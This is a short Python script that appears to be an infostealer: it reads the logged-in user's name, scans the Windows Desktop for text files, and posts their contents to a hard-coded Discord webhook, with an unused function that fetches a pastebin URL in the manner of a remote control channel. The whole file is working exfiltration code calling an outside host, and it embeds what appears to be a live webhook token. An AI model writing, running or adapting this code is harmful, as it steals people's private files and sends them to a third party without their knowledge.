import os
import requests
# import subprocess
from time import sleep
from pathlib import Path
from getpass import getuser
from discord_webhook import DiscordWebhook


#getting logged in user
user = getuser()


def ping():
    sleep(20)
    pingcheck = requests.get("https://pastebin.com/raw/38dyivHp").content.decode('utf-8')
    print(pingcheck)


def send(data):
        hook = "https://discord.com/api/webhooks/822797445897257042/NkaH8kAMlCTwgGs2GBBCSD7YV07G7GQx32W4vAI7nEmdHagd14K6s94iZ6oZIQ6Yc7PK"
        msg = str("```{}```".format(data))
        webhook = DiscordWebhook(url= str(hook), content= msg,)
        response = webhook.execute()


def scan():
    #scaning for files and programmes
    desktop = Path("C:/Users/{}/Desktop".format(user))

    for child in desktop.iterdir():
        xpath = str(child)
        # print(xpath)
        if "txt" in xpath:
            with open(xpath, 'r') as r:
                text = r.readlines()
                # print(text)
                send(text)



scan()